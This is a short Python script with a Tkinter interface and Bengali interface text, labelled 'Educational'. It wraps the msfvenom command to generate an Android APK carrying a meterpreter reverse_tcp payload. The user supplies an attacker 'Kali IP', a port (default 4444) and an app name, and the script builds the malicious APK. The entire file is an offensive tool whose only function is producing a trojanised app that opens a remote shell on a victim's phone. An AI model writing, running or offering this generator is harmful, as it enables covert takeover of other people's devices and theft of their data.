import tkinter as tk
from tkinter import messagebox
import subprocess
import os

def generate_apk():
    ip = entry_ip.get()
    port = entry_port.get()
    filename = entry_name.get()

    if not ip or not port or not filename:
        messagebox.showerror("Error", "সব ঘর পূরণ করুন!")
        return

    if not filename.endswith(".apk"):
        filename += ".apk"

    # msfvenom কমান্ড তৈরি
    command = [
        "msfvenom", "-p", "android/meterpreter/reverse_tcp",
        f"LHOST={ip}", f"LPORT={port}",
        "-o", filename
    ]

    try:
        # কমান্ড রান করা
        result = subprocess.run(command, capture_output=True, text=True)
        
        if os.path.exists(filename):
            messagebox.showinfo("Success", f"APK সফলভাবে তৈরি হয়েছে:\n{os.path.abspath(filename)}")
        else:
            messagebox.showerror("Error", f"APK তৈরি হয়নি!\n\n{result.stderr}")

    except Exception as e:
        messagebox.showerror("Error", f"কোনো সমস্যা হয়েছে: {str(e)}")

# --- GUI ডিজাইন ---
root = tk.Tk()
root.title("Auto APK Generator - Educational")
root.geometry("350x250")

# IP
tk.Label(root, text="LHOST (Kali IP):").pack(pady=5)
entry_ip = tk.Entry(root, width=30)
entry_ip.pack()

# Port
tk.Label(root, text="LPORT (Port):").pack(pady=5)
entry_port = tk.Entry(root, width=30)
entry_port.insert(0, "4444") # ডিফল্ট পোর্ট
entry_port.pack()

# Filename
tk.Label(root, text="APK Name:").pack(pady=5)
entry_name = tk.Entry(root, width=30)
entry_name.insert(0, "my_test_app") # ডিফল্ট নাম
entry_name.pack()

# Button
btn = tk.Button(root, text="Generate APK", command=generate_apk, bg="green", fg="white", font=("Arial", 10, "bold"))
btn.pack(pady=15)

root.mainloop()
